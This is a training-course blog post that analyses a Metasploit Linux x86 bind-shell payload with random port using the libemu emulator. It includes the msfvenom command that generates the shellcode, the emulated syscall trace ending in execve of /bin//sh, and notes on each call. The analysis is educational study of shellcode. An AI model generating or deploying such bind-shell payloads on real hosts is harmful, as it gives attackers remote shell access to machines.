<i>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</i><br /><i> </i><i><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></i><br /><i> </i><i><b>Student ID:</b>&nbsp;SLAE-885</i><br /><i><b>Assignment number: </b>5.2</i><br /><i><b>Github repo:</b> <a href="https://github.com/abatchy17/SLAE">https://github.com/abatchy17/SLAE</a>&nbsp;&nbsp;</i><br /><br />In the second part of assignment 5 in SLAE, I'll be analyzing the linux/x86/shell_bind_tcp_random_port module using Libemu.<br /><br /><h2>1. Setting payload parameters</h2><br />First let's check the options for this module. <br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~/Desktop/libemu/tools/sctest#</span> msfvenom -p linux/x86/shell_bind_tcp_random_port --payload-options<br /><span style="color: black; font-style: italic;">Options for payload/linux/x86/shell_bind_tcp_random_port:</span><br /><br /><br /><span style="color: black; font-style: italic;">       Name: Linux Command Shell, Bind TCP Random Port Inline</span><br /><span style="color: black; font-style: italic;">     Module: payload/linux/x86/shell_bind_tcp_random_port</span><br /><span style="color: black; font-style: italic;">   Platform: Linux</span><br /><span style="color: black; font-style: italic;">       Arch: x86</span><br /><span style="color: black; font-style: italic;">Needs Admin: No</span><br /><span style="color: black; font-style: italic;"> Total size: 57</span><br /><span style="color: black; font-style: italic;">       Rank: Normal</span><br /><br /><span style="color: black; font-style: italic;">Provided by:</span><br /><span style="color: black; font-style: italic;">    Geyslan G. Bem &lt;geyslan@gmail.com&gt;</span><br /><br /><span style="color: black; font-style: italic;">Description:</span><br /><span style="color: black; font-style: italic;">  Listen for a connection in a random port and spawn a command shell. </span><br /><span style="color: black; font-style: italic;">  Use nmap to discover the open port: 'nmap -sS target -p-'.</span><br /></pre></div><br />I skipped over the advanced settings as they won't be discussed in this  post. Lucky for us, this payload doesn't require any options as it will bind to the local IP and choose a port randomly (you'll use nmap to find that port).<br /><br /><h2>2. Analyzing payload with libemu</h2><h2>&nbsp;</h2>After you install libemu (you might need to install a few packages like <b>autoconf</b> and <b>libtool</b>), let's pipe the raw output to ScTest (Iterate 1000 times with verbose output).<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: black;">root</span><span style="border: 1px solid #ef2929; color: #a40000;">@</span><span style="color: black;">kali</span><span style="color: #ce5c00; font-weight: bold;">:~/</span><span style="color: black;">Desktop</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">libemu</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">tools</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">sctest</span><span style="border: 1px solid #ef2929; color: #a40000;">#</span> <span style="color: black;">msfvenom</span> <span style="color: #ce5c00; font-weight: bold;">-</span><span style="color: black;">p</span> <span style="color: black;">linux</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">x86</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">shell_bind_tcp_random_port</span> <span style="color: #ce5c00; font-weight: bold;">-</span><span style="color: black;">f</span> <span style="color: black;">raw</span> <span style="color: #ce5c00; font-weight: bold;">|</span> <span style="color: black; font-weight: bold;">.</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">sctest</span> <span style="color: #ce5c00; font-weight: bold;">-</span><span style="color: black;">vvv</span> <span style="color: #ce5c00; font-weight: bold;">-</span><span style="color: black;">Ss</span> <span style="color: #0000cf; font-weight: bold;">10000</span><br /><span style="color: black;">verbose</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">3</span><br /><span style="color: black;">No</span> <span style="color: black;">platform</span> <span style="color: black;">was</span> <span style="color: black;">selected</span><span style="color: black; font-weight: bold;">,</span> <span style="color: black;">choosing</span> <span style="color: black;">Msf</span><span style="color: #ce5c00; font-weight: bold;">::</span><span style="color: black;">Module</span><span style="color: #ce5c00; font-weight: bold;">::</span><span style="color: black;">Platform</span><span style="color: #ce5c00; font-weight: bold;">::</span><span style="color: black;">Linux</span> <span style="color: black;">from</span> <span style="color: black;">the</span> <span style="color: black;">payload</span><br /><span style="color: black;">No</span> <span style="color: black;">Arch</span> <span style="color: black;">selected</span><span style="color: black; font-weight: bold;">,</span> <span style="color: black;">selecting</span> <span style="color: black;">Arch</span><span style="color: #ce5c00; font-weight: bold;">:</span> <span style="color: black;">x86</span> <span style="color: black;">from</span> <span style="color: black;">the</span> <span style="color: black;">payload</span><br /><span style="color: black;">No</span> <span style="color: black;">encoder</span> <span style="color: black;">or</span> <span style="color: black;">badchars</span> <span style="color: black;">specified</span><span style="color: black; font-weight: bold;">,</span> <span style="color: black;">outputting</span> <span style="color: black;">raw</span> <span style="color: black;">payload</span><br /><span style="color: black;">Payload</span> <span style="color: black;">size</span><span style="color: #ce5c00; font-weight: bold;">:</span> <span style="color: #0000cf; font-weight: bold;">57</span> <span style="color: black;">bytes</span><br /><br /><span style="color: black; font-weight: bold;">...</span> <span style="color: black;">redacted</span> <span style="color: black; font-weight: bold;">...</span><br /><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">socket</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">domain</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">2</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">type</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">protocol</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">listen</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">s</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">backlog</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">accept</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">sockfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: black;">sockaddr_in</span> <span style="color: #ce5c00; font-weight: bold;">*</span> <span style="color: black;">addr</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0x00000000</span> <span style="color: #ce5c00; font-weight: bold;">=&gt;</span> <br />         <span style="color: black;">none</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">addrlen</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0x00000002</span> <span style="color: #ce5c00; font-weight: bold;">=&gt;</span> <br />         <span style="color: black;">none</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">13</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">13</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">12</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">12</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">11</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">11</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">10</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">10</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">9</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">9</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">8</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">8</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">7</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">7</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">6</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">6</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">5</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">5</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">4</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">4</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">3</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">3</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">2</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">2</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">dup2</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">oldfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">newfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">execve</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">const</span> <span style="color: #204a87; font-weight: bold;">char</span> <span style="color: #ce5c00; font-weight: bold;">*</span> <span style="color: black;">dateiname</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0x00416fb6</span> <span style="color: #ce5c00; font-weight: bold;">=&gt;</span> <br />           <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #4e9a06;">"/bin//sh"</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">const</span> <span style="color: #204a87; font-weight: bold;">char</span> <span style="color: #ce5c00; font-weight: bold;">*</span> <span style="color: black;">argv</span><span style="color: black; font-weight: bold;">[]</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: black; font-weight: bold;">[</span><br />           <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0xffffffff</span> <span style="color: #ce5c00; font-weight: bold;">=&gt;</span> <br />             <span style="color: black;">none</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: black; font-weight: bold;">];</span><br />     <span style="color: #204a87; font-weight: bold;">const</span> <span style="color: #204a87; font-weight: bold;">char</span> <span style="color: #ce5c00; font-weight: bold;">*</span> <span style="color: black;">envp</span><span style="color: black; font-weight: bold;">[]</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0x00000000</span> <span style="color: #ce5c00; font-weight: bold;">=&gt;</span> <br />         <span style="color: black;">none</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /></pre></div><br />Lots of debug info, but let's focus on the syscalls being made. To make it easier, sctest allows us to create a visual representation of the flow.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~/Desktop/libemu/tools/sctest#</span> msfvenom -p linux/x86/shell_bind_tcp_random_port -f raw | ./sctest -vvv -Ss 10000 -G tcp_random_port.dot<br /><br /><span style="color: black; font-style: italic;">.. redacted..</span><br /><br /><span style="color: #8f5902;">root@kali:~/Desktop/libemu/tools/sctest#</span> ls<br /><span style="color: black; font-style: italic;">dot.c        Makefile.in  sctest          sctest-sctestmain.o  tests.c</span><br /><span style="color: black; font-style: italic;">dot.h        nanny.c      sctest-dot.o    sctest-tests.o       tests.h</span><br /><span style="color: black; font-style: italic;">Makefile     nanny.h      sctestmain.c    sctest-userhooks.o   userhooks.c</span><br /><span style="color: black; font-style: italic;">Makefile.am  options.h    sctest-nanny.o  tcp_random_port.dot  userhooks.h</span><br /><span style="color: #8f5902;">root@kali:~/Desktop/libemu/tools/sctest#</span> dot tcp_random_port.dot -T png &gt; tcp_random_port.png<br /></pre></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/MH3L6qb.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/MH3L6qb.png" /></a></div><br /><h4>1. socket()</h4><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">socket</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">domain</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">2</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">type</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">protocol</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br /></pre></div><br />Same call we made for both bind and reverse shell previously, creating a socket that supports TCP communication, sockfd returned is 14.<br /><br /><h4>2. listen()</h4><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">listen</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">s</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">backlog</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">;</span><br /></pre></div><br />Next, it starts a listener for incoming connections on sockfd. Note: bind() is not required and a random port is picked. Instead you'll need to scan the host for open ports. More info here: http://stackoverflow.com/questions/12763268/why-is-bind-used-in-tcp-why-is-it-used-only-on-server-side-and-not-in-client<br /><br /><h4>3. accept()</h4><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">accept</span> <span style="color: black; font-weight: bold;">(</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">sockfd</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">14</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: black;">sockaddr_in</span> <span style="color: #ce5c00; font-weight: bold;">*</span> <span style="color: black;">addr</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0x00000000</span> <span style="color: #ce5c00; font-weight: bold;">=&gt;</span> <br />         <span style="color: black;">none</span><span style="color: black; font-weight: bold;">;</span><br />     <span style="color: #204a87; font-weight: bold;">int</span> <span style="color: black;">addrlen</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0x00000002</span> <span style="color: #ce5c00; font-weight: bold;">=&gt;</span> <br />         <span style="color: black;">none</span><span style="color: black; font-weight: bold;">;</span><br /><span style="color: black; font-weight: bold;">)</span> <span style="color: #ce5c00; font-weight: bold;">=</span>  <span style="color: #0000cf; font-weight: bold;">19</span><span style="color: black; font-weight: bold;">;</span><br /></pre></div><br />When there's an incoming connection on the socket created earlier, accept it without storing the client data (sockaddr_in). New sockfd is 19.<br /><br /><h4>4. dup2()&nbsp;</h4><br />Next, the traffic is redirected to the newly created socket (19) by calling dup2(), which will duplicate the STDIN,STDOUT and STDERR to the socket. Notice that there's a loop using ECX as an index, ECX's value is pulled from the latest value pushed onto stack.<br /><br />After accept(), there's a POP ECX command, which will now contain the value last pushed into stack. If you scroll up you'll find that it was a PUSH EAX. EAX contains the sockfd returned from socket(). This allows us to use a small number without worrying too much about looping too much. <br /><br />Of course, this logic any error check, but you don't have that luxury while shellcoding.<br /><br /><h4>5. execve()</h4><br />This part is simple, it's simply calls a /bin/sh shell.<br /><br />- Abatchy